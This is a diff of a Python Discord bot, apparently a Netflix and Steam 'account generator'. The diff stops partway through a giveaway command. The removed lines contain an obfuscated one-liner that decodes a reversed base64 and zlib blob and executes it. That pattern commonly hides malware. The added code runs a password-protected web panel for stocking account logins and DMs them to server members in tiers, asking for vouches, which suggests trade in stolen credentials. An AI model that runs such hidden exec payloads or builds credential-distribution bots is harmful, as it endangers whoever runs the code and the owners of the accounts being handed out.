@@ -1,2 +1,554 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# language: Python 3.11, file: Server.py
+import discord
+from discord import app_commands
+from discord.ext import commands
+import time
+import os
+import asyncio
+import random
+from flask import Flask, request, render_template_string
+import threading
+from dotenv import load_dotenv
+
+# Güvenli bilgileri .env dosyasından yükle
+load_dotenv()
+
+# ==================== AYARLAR ====================
+# DİKKAT: Tüm gizli bilgiler .env dosyasından çekilir. 
+# Eğer .env dosyası yoksa bot hata verir.
+TOKEN = os.getenv("DISCORD_TOKEN")
+OWNER_ID = int(os.getenv("OWNER_ID")) # ID burada yok, .env'den okuyor
+WEB_PASSWORD = os.getenv("WEB_PASSWORD") # Şifre burada yok, .env'den okuyor
+WEB_PORT = int(os.getenv("PORT", 8080))
+
+# Diğer ayarlar (Gizli değil, sabit ID'ler)
+STAFF_ROLES = [1566432003560181891, 1560996761659515003]
+EXCLUSIVE_ROLE = 1560688907199184986
+PREMIUM_ROLE = 1560316365951475852
+JOIN_ROLE = 1560292397982810173
+TICKET_LOG_CHANNEL = 1566423675480186951
+VOUCH_CHANNEL = 1566423691301093437
+PREMIUM_EXCLUSIVE_CHANNEL = 1566423682371420273
+# =================================================
+
+pending_netflix = {} 
+approved_netflix = {}
+
+# ==================== WEB SİTESİ (FLASK) ====================
+web_app = Flask(__name__)
+
+HTML_PAGE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ravex Stock Panel</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #fff; margin: 0; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
+        h2 { text-align: center; color: #7289da; }
+        label { display: block; margin-top: 15px; font-weight: bold; }
+        input[type="text"], input[type="password"], select, textarea { width: 100%; padding: 10px; margin-top: 5px; border-radius: 5px; border: 1px solid #333; background: #2b2b2b; color: white; box-sizing: border-box; }
+        button { margin-top: 20px; width: 100%; padding: 12px; background: #7289da; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        button:hover { background: #5b6eae; }
+        .success { color: #4caf50; text-align: center; margin-top: 15px; }
+        .error { color: #f44336; text-align: center; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>📦 Ravex Stock Panel</h2>
+        <form method="POST">
+            <label>Password</label>
+            <input type="password" name="password" required>
+            
+            <label>Service</label>
+            <select name="service">
+                <option value="steam">Steam</option>
+                <option value="netflix">Netflix</option>
+            </select>
+            
+            <label>Accounts (One per line. For Steam use 2 lines)</label>
+            <textarea name="accounts" rows="8" required placeholder="Steam Name: ornek
+Steam Password: 12345"></textarea>
+            
+            <button type="submit">Add Stock</button>
+        </form>
+        {% if message %}
+            <div class="{{ 'success' if success else 'error' }}">{{ message }}</div>
+        {% endif %}
+    </div>
+</body>
+</html>"""
+
+@web_app.route('/', methods=['GET', 'POST'])
+def index():
+    if request.method == 'POST':
+        if request.form.get('password') != WEB_PASSWORD:
+            return render_template_string(HTML_PAGE, message="Incorrect password!", success=False)
+        
+        service = request.form.get('service')
+        accounts = request.form.get('accounts')
+        
+        if not accounts.strip():
+            return render_template_string(HTML_PAGE, message="Accounts cannot be empty!", success=False)
+            
+        filename = "Netflixok.txt" if service.lower() == "netflix" else "Steamok.txt"
+        
+        try:
+            with open(filename, "a", encoding="utf-8") as f:
+                f.write("\n" + accounts.strip() + "\n")
+            return render_template_string(HTML_PAGE, message=f"Successfully added stock to {service}!", success=True)
+        except Exception as e:
+            return render_template_string(HTML_PAGE, message=f"Error: {e}", success=False)
+
+    return render_template_string(HTML_PAGE)
+
+def run_web_server():
+    web_app.run(host='0.0.0.0', port=WEB_PORT)
+# =========================================================
+
+
+# ==================== TICKET VE MENÜLER ====================
+
+class TicketSelectMenu(discord.ui.Select):
+    def __init__(self):
+        options = [
+            discord.SelectOption(label="Support", emoji="🎧", description="Open a ticket for support issues", value="Support"),
+            discord.SelectOption(label="General", emoji="💬", description="Ask general questions", value="General"),
+            discord.SelectOption(label="Another", emoji="❓", description="For any other issues", value="Another")
+        ]
+        super().__init__(placeholder="Select a category to open a ticket...", min_values=1, max_values=1, options=options, custom_id="ticket_menu")
+
+    async def callback(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+        await create_ticket(interaction, self.values[0])
+
+class TicketMenuView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+        self.add_item(TicketSelectMenu())
+
+class TicketControlView(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @discord.ui.button(label="Claim", emoji="🙋‍♂️", style=discord.ButtonStyle.success, custom_id="t_claim")
+    async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not any(r.id in STAFF_ROLES for r in interaction.user.roles):
+            return await interaction.response.send_message("❌ You don't have the staff role to claim this.", ephemeral=True)
+        button.disabled = True
+        button.label = f"Claimed by {interaction.user.name}"
+        await interaction.message.edit(view=self)
+        await interaction.response.send_message(f"✅ {interaction.user.mention} has claimed this ticket.", ephemeral=False)
+
+    @discord.ui.button(label="Close", emoji="🔒", style=discord.ButtonStyle.danger, custom_id="t_close")
+    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not any(r.id in STAFF_ROLES for r in interaction.user.roles):
+            return await interaction.response.send_message("❌ You don't have the staff role to close this.", ephemeral=True)
+        await interaction.response.send_message("🔒 Closing ticket in 5 seconds...")
+        await asyncio.sleep(5)
+        await interaction.channel.delete()
+
+class GiveawayView(discord.ui.View):
+    def __init__(self, prize, winners, end_time, host_id):
+        super().__init__(timeout=end_time - time.time())
+        self.prize = prize
+        self.winners_count = winners
+        self.end_time = end_time
+        self.host_id = host_id
+        self.entries = set()
+
+    def get_embed(self):
+        embed = discord.Embed(title="🎉 GIVEAWAY 🎉", description=f"**Prize:** {self.prize}\n**Winners:** {self.winners_count}\n**Ends:** <t:{int(self.end_time)}:R>", color=discord.Color.gold())
+        embed.add_field(name="Entries", value=f"👥 **{len(self.entries)}**")
+        return embed
+
+    @discord.ui.button(label="Join", emoji="🎉", style=discord.ButtonStyle.success, custom_id="g_join")
+    async def join_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id in self.entries:
+            return await interaction.response.send_message("❌ You are already in this giveaway!", ephemeral=True)
+        self.entries.add(interaction.user.id)
+        await interaction.message.edit(embed=self.get_embed())
+        await interaction.response.send_message("✅ You joined the giveaway!", ephemeral=True)
+
+    @discord.ui.button(label="Leave", emoji="🚪", style=discord.ButtonStyle.danger, custom_id="g_leave")
+    async def leave_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id not in self.entries:
+            return await interaction.response.send_message("❌ You are not in this giveaway!", ephemeral=True)
+        self.entries.remove(interaction.user.id)
+        await interaction.message.edit(embed=self.get_embed())
+        await interaction.response.send_message("✅ You left the giveaway.", ephemeral=True)
+
+# ==================== BOT CLASS ====================
+
+class MyBot(commands.Bot):
+    def __init__(self):
+        intents = discord.Intents.default()
+        intents.message_content = True
+        intents.members = True
+        super().__init__(command_prefix=".", intents=intents)
+        self.active_giveaways = {}
+        self.cooldowns = {} 
+
+    async def setup_hook(self):
+        await self.tree.sync()
+        self.add_view(TicketMenuView())
+        self.add_view(TicketControlView())
+        print("[+] Slash commands synced.")
+
+    async def on_ready(self):
+        print(f"[+] Logged in as {self.user.name} | Made By kaptan9021_2")
+        await self.change_presence(activity=discord.Game(name="Made By kaptan9021_2"))
+        
+        threading.Thread(target=run_web_server, daemon=True).start()
+        print(f"[+] Web Panel started on port {WEB_PORT}")
+
+    async def on_member_join(self, member):
+        role = member.guild.get_role(JOIN_ROLE)
+        if role:
+            try: await member.add_roles(role)
+            except: pass
+
+bot = MyBot()
+
+# ==================== YARDIMCI FONKSİYONLAR ====================
+
+def get_ticket_number(guild):
+    count = len([c for c in guild.channels if c.name.startswith("ticket-")])
+    return count + 1
+
+async def create_ticket(interaction: discord.Interaction, category: str):
+    guild = interaction.guild
+    staff_roles = [guild.get_role(r) for r in STAFF_ROLES]
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+    }
+    for role in staff_roles:
+        if role: overwrites[role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
+
+    t_num = get_ticket_number(guild)
+    try:
+        channel = await guild.create_text_channel(name=f"ticket-{t_num}", overwrites=overwrites, category=None)
+        embed = discord.Embed(title=f"Ticket #{t_num}", description=f"Category: **{category}**\nOpened by: {interaction.user.mention}\n\nStaff will be with you shortly.", color=discord.Color.blue())
+        mention_str = " ".join([r.mention for r in staff_roles if r])
+        
+        await channel.send(content=mention_str, embed=embed, view=TicketControlView())
+        await interaction.followup.send(f"✅ Ticket created: {channel.mention}", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Error creating ticket: {e}", ephemeral=True)
+
+def check_limit(user_id, type_):
+    if user_id not in bot.cooldowns: bot.cooldowns[user_id] = {}
+    if type_ in bot.cooldowns[user_id]:
+        elapsed = time.time() - bot.cooldowns[user_id][type_]
+        if elapsed < 86400: return False, int(86400 - elapsed)
+    return True, 0
+
+def set_limit(user_id, type_):
+    if user_id not in bot.cooldowns: bot.cooldowns[user_id] = {}
+    bot.cooldowns[user_id][type_] = time.time()
+
+def pop_account(filename):
+    if not os.path.exists(filename): return None
+    with open(filename, "r", encoding="utf-8") as f:
+        lines = [line.strip() for line in f if line.strip()]
+    if not lines: return None
+    if "steam" in filename.lower() and len(lines) >= 2:
+        acc = f"{lines[0]}\n{lines[1]}"
+        lines = lines[2:]
+    else:
+        acc = lines[0]
+        lines = lines[1:]
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write("\n".join(lines) + ("\n" if lines else ""))
+    return acc
+
+def count_accounts(filename):
+    if not os.path.exists(filename): return 0
+    with open(filename, "r", encoding="utf-8") as f:
+        lines = [l for l in f if l.strip()]
+    if "steam" in filename.lower(): return len(lines) // 2
+    return len(lines)
+
+# ==================== SLASH KOMUTLARI ====================
+
+@bot.tree.command(name="ticket", description="Open a support ticket menu")
+async def ticket_cmd(interaction: discord.Interaction):
+    embed = discord.Embed(title="🎟️ Support Tickets", description="Please select a category from the menu below to open a ticket.", color=discord.Color.blurple())
+    await interaction.response.send_message(embed=embed, view=TicketMenuView())
+
+@bot.tree.command(name="stock", description="Check available stock")
+async def stock_cmd(interaction: discord.Interaction):
+    await interaction.response.defer()
+    nf_count = count_accounts("Netflixok.txt")
+    st_count = count_accounts("Steamok.txt")
+    embed = discord.Embed(title="📦 Current Stock", color=discord.Color.green())
+    embed.add_field(name="Netflix", value=f"**{nf_count}** accounts", inline=True)
+    embed.add_field(name="Steam", value=f"**{st_count}** accounts", inline=True)
+    await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="generate", description="Generate an account")
+@app_commands.describe(service="Select service", plan="Select plan")
+@app_commands.choices(
+    service=[app_commands.Choice(name="Netflix", value="netflix"), app_commands.Choice(name="Steam", value="steam")],
+    plan=[app_commands.Choice(name="Normal", value="normal"), app_commands.Choice(name="Premium", value="premium"), app_commands.Choice(name="Exclusive", value="exclusive")]
+)
+async def generate_cmd(interaction: discord.Interaction, service: app_commands.Choice[str], plan: app_commands.Choice[str]):
+    user_roles = [r.id for r in interaction.user.roles]
+    service_val = service.value
+    plan_val = plan.value
+    
+    if plan_val in ["premium", "exclusive"] and interaction.channel_id != PREMIUM_EXCLUSIVE_CHANNEL:
+        return await interaction.response.send_message(f"❌ You can only use this plan in <#{PREMIUM_EXCLUSIVE_CHANNEL}>.", ephemeral=True)
+
+    if plan_val == "premium" and PREMIUM_ROLE not in user_roles:
+        return await interaction.response.send_message("❌ You don't have the Premium role.", ephemeral=True)
+    if plan_val == "exclusive" and EXCLUSIVE_ROLE not in user_roles:
+        return await interaction.response.send_message("❌ You don't have the Exclusive role.", ephemeral=True)
+
+    await interaction.response.defer()
+
+    if service_val == "steam":
+        limit_ok, time_left = check_limit(interaction.user.id, f"steam_{plan_val}")
+        if not limit_ok: return await interaction.followup.send(f"❌ Limit reached. Try again in {time_left//3600}h.", ephemeral=True)
+        
+        acc = pop_account("Steamok.txt")
+        if not acc: return await interaction.followup.send("❌ Out of stock!", ephemeral=True)
+        
+        set_limit(interaction.user.id, f"steam_{plan_val}")
+        limit_max = 100 if plan_val == "exclusive" else (10 if plan_val == "premium" else 3)
+        
+        try:
+            await interaction.user.send(f"🎁 **Steam Account ({plan_val.capitalize()})**\n\n```\n{acc}\n```\n\n*Limit: 1/{limit_max}*")
+            await interaction.followup.send(f"Generated, Check Your DMs and Vouch <#{VOUCH_CHANNEL}> - Legit Ravex write")
+        except:
+            await interaction.followup.send("❌ DMs closed.", ephemeral=True)
+
+    elif service_val == "netflix":
+        limit_ok, time_left = check_limit(interaction.user.id, "netflix")
+        if not limit_ok: return await interaction.followup.send(f"❌ Limit reached. Try again in {time_left//3600}h.", ephemeral=True)
+        
+        acc = pop_account("Netflixok.txt")
+        if not acc: return await interaction.followup.send("❌ Out of stock!", ephemeral=True)
+
+        set_limit(interaction.user.id, "netflix")
+        pending_netflix[interaction.user.id] = acc
+        
+        await interaction.followup.send(f"✅ Generated, Check Your DMs and Vouch <#{VOUCH_CHANNEL}> - Legit Ravex write (Wait 20 minutes)")
+        
+        owner = await bot.fetch_user(OWNER_ID)
+        if owner:
+            embed = discord.Embed(title="🎬 New Netflix Request", color=discord.Color.red())
+            embed.add_field(name="User", value=f"{interaction.user.mention} (ID: {interaction.user.id})", inline=False)
+            embed.add_field(name="Account Info", value=f"```{acc}```", inline=False)
+            embed.set_footer(text="Reply with: .okey @user")
+            await owner.send(embed=embed)
+
+@bot.tree.command(name="delete", description="Delete messages")
+@app_commands.describe(amount="Number of messages to scan and delete", empty_only="Sadece boş mesajları sil (True/False)")
+async def delete_cmd(interaction: discord.Interaction, amount: int, empty_only: bool = True):
+    if not any(r.id in STAFF_ROLES for r in interaction.user.roles) and interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("❌ Staff only.", ephemeral=True)
+    
+    await interaction.response.defer(ephemeral=True)
+    
+    try:
+        if empty_only:
+            deleted_count = 0
+            async for message in interaction.channel.history(limit=amount):
+                if not message.content.strip() or not message.content.isprintable():
+                    try:
+                        await message.delete()
+                        deleted_count += 1
+                    except:
+                        pass
+            await interaction.followup.send(f"✅ **{amount}** mesaj tarandı, **{deleted_count}** boş mesaj silindi.", ephemeral=True)
+        else:
+            await interaction.channel.purge(limit=amount)
+            await interaction.followup.send(f"✅ **{amount}** mesaj silindi.", ephemeral=True)
+    except Exception as e:
+        await interaction.followup.send(f"❌ Hata: {e}", ephemeral=True)
+
+@bot.tree.command(name="giveaway", description="Start a giveaway")
+@app_commands.describe(channel="Channel", prize="Prize", duration="Duration (e.g. 10m, 1h, 1d)", winners="Number of winners")
